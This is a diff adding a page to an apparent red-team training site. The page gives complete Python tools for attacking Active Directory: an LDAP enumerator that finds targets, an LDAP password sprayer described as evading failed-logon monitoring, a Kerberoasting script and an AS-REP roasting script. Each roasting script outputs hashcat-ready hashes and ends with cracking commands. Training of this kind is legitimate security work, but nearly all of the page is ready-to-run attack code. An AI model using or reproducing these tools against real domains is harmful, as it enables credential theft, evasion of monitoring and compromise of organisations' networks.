@@ -1,0 +1,465 @@
+---
+import TrainingPage from '../../layouts/TrainingPage.astro';
+---
+<TrainingPage
+  title="Python Active Directory Tools — Red Team Academy"
+  module="Tool Development"
+  tags={['python', 'active-directory', 'ldap3', 'impacket', 'kerberoasting', 'password-spraying']}
+  pageKey="tooldev-python-ad-tools"
+>
+  <h1>Python Active Directory Tools</h1>
+
+  <h2>Overview</h2>
+  <p>Python has a richer ecosystem for attacking Active Directory than any other language. The <strong>ldap3</strong> library provides authenticated LDAP queries without requiring Windows RSAT; <strong>impacket</strong> implements nearly every Microsoft protocol (SMB, DCE/RPC, Kerberos, MS-DRSR) in pure Python; and the standard library's <code>socket</code> and <code>struct</code> modules can hand-craft raw Kerberos AS-REQ packets for password spraying without triggering a full Kerberos library load. This module builds each attack tool from scratch so the internals are clear.</p>
+  <p>Dependencies: <code>pip install ldap3 impacket</code>. All tools run from Linux or Windows.</p>
+
+  <h2>LDAP Domain Enumerator (ldap3)</h2>
+  <p>ldap3 wraps the LDAP protocol in a clean Python API. After a simple <code>Connection</code> object is created with credentials (or anonymously if the DC allows it), LDAP search filters are used to enumerate users, groups, computers, and ACLs — replicating what BloodHound collects, in plain Python.</p>
+  <pre><code>#!/usr/bin/env python3
+"""
+ldap_enum.py — Authenticated LDAP enumeration of an Active Directory domain.
+Usage: python3 ldap_enum.py --dc 10.10.10.10 --domain corp.local -u jsmith -p 'Password1!'
+Dumps: users, groups, computers, Kerberoastable accounts, unconstrained delegation hosts.
+"""
+
+import json
+from argparse import ArgumentParser
+from ldap3 import Server, Connection, ALL, NTLM, SUBTREE
+
+# ── LDAP search helper ────────────────────────────────────────────────────────
+def ldap_search(conn: Connection, base_dn: str,
+                search_filter: str, attributes: list[str]) -> list[dict]:
+    """
+    Execute an LDAP search and return results as a list of attribute dicts.
+    conn.search() populates conn.entries; we convert to plain dicts for portability.
+    """
+    conn.search(
+        search_base=base_dn,
+        search_filter=search_filter,
+        search_scope=SUBTREE,
+        attributes=attributes,
+        paged_size=1000        # request 1000 entries per page (LDAP paging)
+    )
+    results = []
+    for entry in conn.entries:
+        record = &#123;&#125;
+        for attr in attributes:
+            try:
+                val = entry[attr].value
+                # Convert bytes to hex string for JSON serialisation
+                if isinstance(val, bytes):
+                    val = val.hex()
+                record[attr] = val
+            except Exception:
+                record[attr] = None
+        results.append(record)
+    return results
+
+def domain_to_dn(domain: str) -> str:
+    """Convert 'corp.local' to 'DC=corp,DC=local'."""
+    return ",".join(f"DC=&#123;part&#125;" for part in domain.split("."))
+
+def run_enum(args) -> None:
+    domain_dn = domain_to_dn(args.domain)
+    server     = Server(args.dc, get_info=ALL)
+
+    # NTLM bind — works with domain\user or UPN; safer than SIMPLE for modern DCs
+    conn = Connection(
+        server,
+        user=f"&#123;args.domain&#125;\\&#123;args.user&#125;",
+        password=args.password,
+        authentication=NTLM,
+        auto_bind=True
+    )
+    print(f"[+] Bound to &#123;args.dc&#125; as &#123;args.user&#125;")
+
+    # ── Enumerate all users ──────────────────────────────────────────────────
+    users = ldap_search(conn, domain_dn,
+        search_filter="(&(objectClass=user)(objectCategory=person))",
+        attributes=["sAMAccountName", "mail", "userAccountControl",
+                    "pwdLastSet", "lastLogon", "memberOf", "adminCount",
+                    "servicePrincipalName", "description"]
+    )
+    print(f"[*] Found &#123;len(users)&#125; user accounts")
+
+    # ── Find Kerberoastable accounts (have an SPN set, not just computers) ──
+    kerb = [u for u in users if u.get("servicePrincipalName")]
+    print(f"[!] Kerberoastable users (SPN set): &#123;len(kerb)&#125;")
+    for u in kerb:
+        print(f"    &#123;u['sAMAccountName']&#125; — SPN: &#123;u['servicePrincipalName']&#125;")
+
+    # ── Find AS-REP roastable (DONT_REQUIRE_PREAUTH flag = UAC bit 0x400000) ──
+    # userAccountControl flags: https://learn.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties
+    asrep = ldap_search(conn, domain_dn,
+        search_filter="(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))",
+        attributes=["sAMAccountName", "userAccountControl"]
+    )
+    print(f"[!] AS-REP roastable (no pre-auth): &#123;len(asrep)&#125;")
+
+    # ── Enumerate computers with unconstrained delegation ────────────────────
+    # UAC bit 0x80000 (524288) = TRUSTED_FOR_DELEGATION
+    uncon_deleg = ldap_search(conn, domain_dn,
+        search_filter="(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))",
+        attributes=["dNSHostName", "operatingSystem", "userAccountControl"]
+    )
+    print(f"[!] Unconstrained delegation hosts: &#123;len(uncon_deleg)&#125;")
+
+    # ── Enumerate all groups and high-value group members ────────────────────
+    priv_groups = ["Domain Admins", "Enterprise Admins", "Schema Admins",
+                   "Backup Operators", "Account Operators", "Server Operators"]
+    for grp in priv_groups:
+        members = ldap_search(conn, domain_dn,
+            search_filter=f"(&(objectClass=group)(cn=&#123;grp&#125;))",
+            attributes=["member"]
+        )
+        if members and members[0].get("member"):
+            m = members[0]["member"]
+            member_list = m if isinstance(m, list) else [m]
+            print(f"[!] &#123;grp&#125; members (&#123;len(member_list)&#125;):")
+            for dn in member_list:
+                print(f"    &#123;dn&#125;")
+
+    # ── Write full results to JSON ────────────────────────────────────────────
+    output = &#123;"users": users, "kerberoastable": kerb, "asrep_roastable": asrep,
+               "unconstrained_delegation": uncon_deleg&#125;
+    with open("ldap_results.json", "w") as fh:
+        json.dump(output, fh, indent=2, default=str)
+    print("[+] Full results written to ldap_results.json")
+
+    conn.unbind()
+
+if __name__ == "__main__":
+    ap = ArgumentParser()
+    ap.add_argument("--dc",     required=True, help="Domain controller IP or hostname")
+    ap.add_argument("--domain", required=True, help="Domain name (e.g. corp.local)")
+    ap.add_argument("-u",       dest="user",     required=True)
+    ap.add_argument("-p",       dest="password", required=True)
+    run_enum(ap.parse_args())</code></pre>
+
+  <h2>LDAP Password Sprayer</h2>
+  <p>LDAP simple-bind password spraying is stealthier than SMB spraying because it generates LDAP event ID 2889 rather than the more-monitored 4625 (failed logon). The sprayer implements per-user lockout awareness by tracking consecutive failures and pausing to respect the domain's observation window, preventing account lockouts.</p>
+  <pre><code>#!/usr/bin/env python3
+"""
+ldap_spray.py — Lockout-aware LDAP password sprayer.
+Usage: python3 ldap_spray.py --dc 10.10.10.10 --domain corp.local
+       --users users.txt --password 'Spring2026!'
+       --lockout-threshold 3 --lockout-window 30
+
+Lockout logic:
+  - Tracks per-user attempt count.
+  - If --lockout-threshold reached, sleeps --lockout-window minutes before next attempt.
+  - Stops spraying a user after one valid credential found.
+"""
+
+import time
+import socket
+import ssl
+import struct
+import sys
+from argparse import ArgumentParser
+from dataclasses import dataclass, field
+
+# Use ldap3 for clean LDAP binds; each bind attempt creates a fresh connection
+from ldap3 import Server, Connection, SIMPLE, SYNC, core
+
+
+@dataclass
+class SprayState:
+    """Track per-user attempt counts and found credentials."""
+    attempt_counts: dict[str, int] = field(default_factory=dict)
+    found: list[tuple[str, str]]   = field(default_factory=list)
+    locked: set[str]               = field(default_factory=set)
+
+
+def try_bind(dc: str, domain: str, username: str, password: str,
+             timeout: float = 5.0) -> bool:
+    """
+    Attempt LDAP simple-bind as domain\\username.
+    Returns True on successful authentication, False on failure.
+    Raises exceptions for network errors (not auth failures).
+    """
+    server = Server(dc, connect_timeout=timeout)
+    try:
+        conn = Connection(
+            server,
+            user=f"&#123;domain&#125;\\&#123;username&#125;",
+            password=password,
+            authentication=SIMPLE,
+            auto_bind=True,
+            raise_exceptions=False   # don't raise on auth failure — check result
+        )
+        # result code 0 = success; 49 = invalidCredentials
+        success = conn.result["result"] == 0
+        conn.unbind()
+        return success
+    except core.exceptions.LDAPSocketOpenError:
+        print(f"[!] Cannot reach DC &#123;dc&#125; — check connectivity", file=sys.stderr)
+        raise
+    except Exception:
+        return False
+
+
+def spray(args) -> None:
+    users    = [u.strip() for u in open(args.users) if u.strip()]
+    password = args.password
+    state    = SprayState()
+
+    print(f"[*] Spraying &#123;len(users)&#125; users with password: &#123;password&#125;")
+    print(f"[*] Lockout threshold: &#123;args.lockout_threshold&#125; / window: &#123;args.lockout_window&#125;m")
+    print(f"[*] Inter-attempt delay: &#123;args.delay&#125;s\n")
+
+    for i, username in enumerate(users):
+        # Skip users already found or locked out
+        if username in state.locked:
+            continue
+
+        try:
+            if try_bind(args.dc, args.domain, username, password):
+                print(f"  [VALID] &#123;username&#125; : &#123;password&#125;")
+                state.found.append((username, password))
+            else:
+                # Track failures; if threshold reached, pause to avoid lockout
+                state.attempt_counts[username] = state.attempt_counts.get(username, 0) + 1
+                if state.attempt_counts[username] &gt;= args.lockout_threshold:
+                    print(f"  [PAUSE] &#123;username&#125; near lockout — waiting &#123;args.lockout_window&#125;m")
+                    time.sleep(args.lockout_window * 60)
+                    state.attempt_counts[username] = 0   # reset counter after window
+        except Exception:
+            break  # network error — abort
+
+        # Global inter-attempt delay to avoid rate-limit triggers
+        time.sleep(args.delay)
+
+        # Progress indicator every 50 users
+        if (i + 1) % 50 == 0:
+            print(f"[*] Progress: &#123;i+1&#125;/&#123;len(users)&#125; — &#123;len(state.found)&#125; found so far")
+
+    print(f"\n[+] Spray complete. Valid credentials found: &#123;len(state.found)&#125;")
+    for user, pw in state.found:
+        print(f"  &#123;args.domain&#125;\\&#123;user&#125; : &#123;pw&#125;")
+
+
+if __name__ == "__main__":
+    ap = ArgumentParser(description="LDAP password sprayer")
+    ap.add_argument("--dc",               required=True, help="DC IP")
+    ap.add_argument("--domain",           required=True, help="Domain (e.g. corp.local)")
+    ap.add_argument("--users",            required=True, help="Usernames file (one per line)")
+    ap.add_argument("--password",         required=True, help="Password to spray")
+    ap.add_argument("--delay",            type=float, default=1.0,  help="Seconds between attempts")
+    ap.add_argument("--lockout-threshold",type=int,   default=3,    dest="lockout_threshold")
+    ap.add_argument("--lockout-window",   type=int,   default=30,   dest="lockout_window",
+                    help="Minutes to wait after reaching threshold")
+    spray(ap.parse_args())</code></pre>
+
+  <h2>Kerberoasting with Impacket</h2>
+  <p>Impacket's <code>GetUserSPNs.py</code> implements the full Kerberoasting flow: enumerate SPNs via LDAP, request a TGS for each SPN, extract the encrypted portion, and output a hashcat-ready hash. The code below replicates this flow manually to show each step — from the Kerberos AS-REQ to the TGS-REP hash extraction.</p>
+  <pre><code>#!/usr/bin/env python3
+"""
+kerberoast.py — Request TGS tickets for all SPN-bearing accounts and output hashcat hashes.
+Usage: python3 kerberoast.py --dc 10.10.10.10 --domain corp.local -u jsmith -p 'Password1!'
+Output: kerberoast_hashes.txt (hashcat -m 13100 format)
+
+Dependencies: pip install impacket
+"""
+
+from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
+from impacket.krb5.types import KerberosTime, Principal
+from impacket.krb5 import constants
+from impacket.ntlm import compute_lmhash, compute_nthash
+from ldap3 import Server, Connection, ALL, NTLM, SUBTREE
+from argparse import ArgumentParser
+import datetime
+
+def domain_to_dn(domain: str) -> str:
+    return ",".join(f"DC=&#123;p&#125;" for p in domain.split("."))
+
+def get_spn_accounts(dc: str, domain: str, user: str, password: str) -> list[dict]:
+    """Query LDAP for all user accounts with a ServicePrincipalName set."""
+    conn = Connection(
+        Server(dc, get_info=ALL),
+        user=f"&#123;domain&#125;\\&#123;user&#125;",
+        password=password,
+        authentication=NTLM,
+        auto_bind=True
+    )
+    base_dn = domain_to_dn(domain)
+    conn.search(
+        search_base=base_dn,
+        search_filter="(&(objectClass=user)(servicePrincipalName=*)(!(objectClass=computer)))",
+        attributes=["sAMAccountName", "servicePrincipalName"]
+    )
+    spn_accounts = []
+    for entry in conn.entries:
+        spns = entry.servicePrincipalName.values
+        spn_accounts.append(&#123;
+            "account": entry.sAMAccountName.value,
+            "spns":    spns if isinstance(spns, list) else [spns]
+        &#125;)
+    conn.unbind()
+    return spn_accounts
+
+def request_tgs_hash(dc: str, domain: str, user: str, password: str, spn: str) -> str | None:
+    """
+    Perform full Kerberos exchange:
+    1. AS-REQ → get TGT (using username + password)
+    2. TGS-REQ → request service ticket for the SPN
+    3. Extract encrypted blob from TGS-REP → format as hashcat $krb5tgs$23$ hash
+    """
+    try:
+        # Step 1: get a TGT using the attacker's credentials
+        client_name = Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+        tgt, cipher, old_session_key, session_key = getKerberosTGT(
+            clientName=client_name,
+            password=password,
+            domain=domain,
+            lmhash=b"",
+            nthash=b"",
+            kdcHost=dc,
+        )
+        # Step 2: use the TGT to request a TGS for the target SPN
+        server_name = Principal(spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
+        tgs, cipher, old_session_key, session_key = getKerberosTGS(
+            serverName=server_name,
+            domain=domain,
+            kdcHost=dc,
+            tgt=tgt,
+            cipher=cipher,
+            sessionKey=session_key,
+        )
+        # Step 3: extract the encryptedTicket from the KRB_TGS_REP ASN.1 structure
+        # The encrypted part uses RC4-HMAC (etype 23) for crackable tickets
+        # impacket's tgs object exposes the encrypted service ticket bytes:
+        enc_part = tgs["ticket"]["enc-part"]["cipher"].asOctets()
+
+        # Format for hashcat mode 13100 ($krb5tgs$23$*user*domain*spn*hash)
+        enc_hex  = enc_part.hex()
+        checksum = enc_hex[:32]          # first 16 bytes (32 hex chars) = checksum
+        data     = enc_hex[32:]          # remainder = encrypted data
+
+        hash_str = f"$krb5tgs$23$*&#123;user&#125;*&#123;domain&#125;*&#123;spn&#125;*&#123;checksum&#125;$&#123;data&#125;"
+        return hash_str
+
+    except Exception as e:
+        print(f"  [!] Failed for SPN &#123;spn&#125;: &#123;e&#125;")
+        return None
+
+def run(args) -> None:
+    print(f"[*] Fetching SPNs from &#123;args.dc&#125;...")
+    accounts = get_spn_accounts(args.dc, args.domain, args.user, args.password)
+    print(f"[+] Found &#123;len(accounts)&#125; Kerberoastable accounts")
+
+    hashes = []
+    for acct in accounts:
+        for spn in acct["spns"]:
+            print(f"[*] Requesting TGS: &#123;acct['account']&#125; / &#123;spn&#125;")
+            h = request_tgs_hash(args.dc, args.domain, args.user, args.password, spn)
+            if h:
+                hashes.append(h)
+                print(f"  [+] Got hash for &#123;spn&#125;")
+
+    with open("kerberoast_hashes.txt", "w") as fh:
+        fh.write("\n".join(hashes) + "\n")
+    print(f"\n[+] &#123;len(hashes)&#125; hashes written to kerberoast_hashes.txt")
+    print("[*] Crack with: hashcat -m 13100 kerberoast_hashes.txt rockyou.txt")
+
+if __name__ == "__main__":
+    ap = ArgumentParser()
+    ap.add_argument("--dc",     required=True)
+    ap.add_argument("--domain", required=True)
+    ap.add_argument("-u", dest="user",     required=True)
+    ap.add_argument("-p", dest="password", required=True)
+    run(ap.parse_args())</code></pre>
+
+  <h2>AS-REP Roasting (No Pre-Authentication)</h2>
+  <p>AS-REP roasting targets accounts with Kerberos pre-authentication disabled (<code>DONT_REQUIRE_PREAUTH</code> UAC flag). The attacker sends a raw AS-REQ without a timestamp authenticator; the KDC responds with an AS-REP containing the account's TGT encrypted with the user's key. No valid credentials are needed — just a username list.</p>
+  <pre><code>#!/usr/bin/env python3
+"""
+asrep_roast.py — AS-REP roasting without credentials (no pre-auth required).
+Usage: python3 asrep_roast.py --dc 10.10.10.10 --domain corp.local --users asrep_users.txt
+
+--users: list of usernames whose DONT_REQUIRE_PREAUTH flag is set.
+         (Find them with ldap_enum.py first, or query with dsquery)
+Output: asrep_hashes.txt (hashcat -m 18200 format)
+"""
+
+from impacket.krb5 import constants, types
+from impacket.krb5.asn1 import AS_REQ, AS_REP, seq_set, seq_set_iter
+from impacket.krb5.kerberosv5 import sendReceive
+from impacket.krb5.types import KerberosTime, Principal
+from pyasn1.codec.der import decoder, encoder
+from pyasn1.type.univ import noValue
+import datetime
+import pathlib
+from argparse import ArgumentParser
+
+def build_asreq_no_preauth(username: str, domain: str) -> bytes:
+    """
+    Build a minimal AS-REQ for the given username without a PA-ENC-TIMESTAMP
+    preauthenticator. This is all that's needed to elicit an AS-REP from DCs
+    whose accounts have DONT_REQUIRE_PREAUTH set.
+    """
+    client = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+    server = Principal(
+        f"krbtgt/&#123;domain&#125;",
+        type=constants.PrincipalNameType.NT_SRV_INST.value
+    )
+    now   = datetime.datetime.utcnow()
+    req   = AS_REQ()
+
+    req_body = req["req-body"]
+    req_body["kdc-options"]     = constants.encodeFlags([0])    # no special flags
+    req_body["cname"]           = seq_set(client, "name")
+    req_body["realm"]           = domain.upper()
+    req_body["sname"]           = seq_set(server, "name")
+    req_body["till"]            = KerberosTime.to_asn1(now + datetime.timedelta(days=1))
+    req_body["rtime"]           = KerberosTime.to_asn1(now + datetime.timedelta(days=1))
+    req_body["nonce"]           = 0x12345678
+    # Request RC4-HMAC (etype 23) — crackable; also request AES256 (18) for newer DCs
+    seq_set_iter(req_body, "etype", [constants.EncryptionTypes.rc4_hmac.value,
+                                     constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value])
+    # No pA-data (no preauth) — this is what makes AS-REP roasting possible
+    return encoder.encode(req)
+
+def extract_hash(username: str, domain: str, asrep_raw: bytes) -> str:
+    """
+    Parse the AS-REP and extract the encrypted part for offline cracking.
+    Formats as hashcat $krb5asrep$23$ (mode 18200).
+    """
+    asrep, _ = decoder.decode(asrep_raw, asn1Spec=AS_REP())
+    enc_part  = asrep["enc-part"]
+    etype     = int(enc_part["etype"])
+    cipher    = bytes(enc_part["cipher"])
+    enc_hex   = cipher.hex()
+    # hashcat 18200: $krb5asrep$etype$user@DOMAIN:checksum$data
+    return f"$krb5asrep$&#123;etype&#125;$&#123;username&#125;@&#123;domain.upper()&#125;:&#123;enc_hex[:32]&#125;$&#123;enc_hex[32:]&#125;"
+
+def roast(args) -> None:
+    users  = pathlib.Path(args.users).read_text().splitlines()
+    hashes = []
+
+    for username in users:
+        username = username.strip()
+        if not username:
+            continue
+        try:
+            req_data = build_asreq_no_preauth(username, args.domain)
+            # sendReceive sends the request to the KDC and returns the raw response
+            raw_reply = sendReceive(req_data, args.domain, args.dc)
+            h = extract_hash(username, args.domain, raw_reply)
+            hashes.append(h)
+            print(f"[+] Got AS-REP hash for &#123;username&#125;")
+        except Exception as e:
+            print(f"[-] &#123;username&#125;: &#123;e&#125;")
+
+    pathlib.Path("asrep_hashes.txt").write_text("\n".join(hashes) + "\n")
+    print(f"\n[+] &#123;len(hashes)&#125; hashes in asrep_hashes.txt")
+    print("[*] Crack with: hashcat -m 18200 asrep_hashes.txt rockyou.txt")
+
+if __name__ == "__main__":
+    ap = ArgumentParser()
+    ap.add_argument("--dc",     required=True)
+    ap.add_argument("--domain", required=True)
+    ap.add_argument("--users",  required=True)
+    roast(ap.parse_args())</code></pre>
+
+</TrainingPage>
